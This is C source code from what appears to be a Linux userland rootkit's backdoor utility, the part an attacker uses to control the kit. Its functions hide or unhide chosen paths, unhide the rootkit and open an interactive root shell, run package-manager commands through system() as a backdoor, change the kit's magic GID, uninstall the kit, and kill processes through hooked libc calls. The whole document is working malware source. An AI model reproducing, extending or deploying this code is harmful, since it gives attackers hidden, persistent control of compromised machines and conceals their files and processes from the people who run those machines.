void option_err(char *a0){
    printf("\e[1;31mValid commands:\e[0m\n");
    printf("\t%s hide/unhide <path>\n", a0);
    printf("\t%s uninstall\n", a0);
    printf("\t%s unhideself\n", a0);
    printf("\t%s makelinks\n", a0);
#ifdef READ_GID_FROM_FILE
    printf("\t%s changegid\n", a0);
#endif
#ifdef BACKDOOR_PKGMAN
    char validmans[128], tmp[8];
    memset(validmans, 0, sizeof(validmans));
    for(int i = 0; i != sizeofarr(validpkgmans); i++){
        memset(tmp, 0, sizeof(tmp));
        snprintf(tmp, sizeof(tmp), "%s/", validpkgmans[i]);
        strncat(validmans, tmp, 8);
    }
    validmans[strlen(validmans)-1]='\0';
    printf("\t%s %s <args>\n", a0, validmans);
#endif
    exit(0);
}

void do_self(void){
    printf("Unhiding self...\n");
    chdir("/");
    unhide_self();
    system("id");
    printf("You're now totally visible. 'exit' when you want to return to being hidden.\n");

    char *args[3];
    args[0] = "/bin/sh";
    args[1] = "-i";
    args[2] = NULL;

#ifdef SET_MAGIC_ENV_UNHIDE
    char *env[2];
    env[0] = BD_VAR"=1";
    env[1] = NULL;
    hook(CEXECVE);
    call(CEXECVE, args[0], args, env);
#else
    execl(args[0], args[1], NULL);
#endif

    hide_self();
    exit(0);
}

void symlinkstuff(void){
    hook(CACCESS, CSYMLINK);

    char *src, *dest, *linkname;
    int ok=0, fail=0, acc, syml;
    for(int i = 0; i != LINKSRCS_SIZE; i++){
        src = linksrcs[i];
        dest = linkdests[i];
        linkname = basename(dest);

        acc = (long)call(CACCESS, src, F_OK);
        if(acc < 0){
            printf("Something went wrong trying to access %s (\e[31m%s\e[0m)\n", src, linkname);
            fail++;
            continue;
        }

        syml = (long)call(CSYMLINK, src, dest);
        if(syml < 0 && errno == EEXIST){
            printf("Link \e[31m%s\e[0m already exists... It \e[1mreally\e[0m shouldn't.\n", linkname);
            continue;
        }else if(syml < 0){
            printf("Failed linking: %s -> ~/\e[31m%s\e[0m\n", src, linkname);
            fail++;
        }else ok++;
    }

    if(fail > 0) printf("Failed links: \e[31m%d\e[0m\n", fail);
    exit(0);
}

/* everything in here calls to misc rootkit utils. */
void dobdvutil(char *const argv[]){
    char *option, *path;
    int path_status;

    option = argv[1];
    if(option == NULL)
        option_err(argv[0]);

#ifdef BACKDOOR_PKGMAN
    char *pkgman;
    for(int pkgmani = 0; pkgmani != sizeofarr(validpkgmans); pkgmani++){
        pkgman = validpkgmans[pkgmani];

        if(!strcmp(pkgman, option)){
            char argbuf[512], tmp[128];
            memset(argbuf, 0, sizeof(argbuf));
            chdir("/");
            unhide_self();
            system("id");
            for(int argi = 1; argv[argi] != NULL; argi++){
                memset(tmp, 0, sizeof(tmp));
                snprintf(tmp, sizeof(tmp), "%s ", argv[argi]);
                strcat(argbuf, tmp);
            }
            argbuf[strlen(argbuf)-1]='\0';
            printf("system(\"%s\");\n", argbuf);
            system(argbuf);
            exit(0);
        }
    }
#endif

#ifdef READ_GID_FROM_FILE
    if(!strcmp("changegid", option)){
        gid_t newgid;
        printf("Changing kit GID.\n");
        printf("Current GID: %d\n", readgid());
        printf("Press enter to continue.");
        getchar();
        
        newgid = changerkgid();
        printf("New GID: %d\n", newgid);

        hook(CKILL);
        call(CKILL, getppid(), SIGKILL);
        call(CKILL, getpid(), SIGKILL);
        exit(0);
    }
#endif

    if(!strcmp("uninstall", option)){
        uninstallbdv();
        hook(CKILL);
        call(CKILL, getppid(), SIGKILL);
        call(CKILL, getpid(), SIGKILL);
        exit(0);
    }

    if(!strcmp("unhideself", option))
        do_self();

    if(!strcmp("makelinks", option))
        symlinkstuff();

    // option was neither changegid or unhideself.
    // file op desired.
    path = argv[2];
    if(path == NULL)
        option_err(argv[0]);

    hook(CACCESS);
    path_status = (long)call(CACCESS, path, F_OK);
    if(path_status != 0){
        printf("%s\n", ERR_ACSS_PATH);
        exit(-1);
    }

    /* hide or unhide given path */
    if(!strncmp("hide", option, 4)){
        switch(hide_path(path)){
            case PATH_DONE:
                printf("%s\n", ALRDY_HIDDEN_STR);
                break;
            case PATH_SUCC:
                printf("%s\n", PATH_HIDDEN_STR);
                break;
            case PATH_ERR:
                printf("%s\n", ERR_HIDING_PATH);
                break;
        }
    }else if(!strncmp("unhide", option, 6)){
        switch(unhide_path(path)){
            case PATH_DONE:
                printf("%s\n", ALRDY_VISIBLE_STR);
                break;
            case PATH_SUCC:
                printf("%s\n", PATH_VISIBLE_STR);
                break;
            case PATH_ERR:
                printf("%s\n", ERR_UNHIDING_PATH);
                break;
        }
    }else option_err(argv[0]);

    exit(0);
}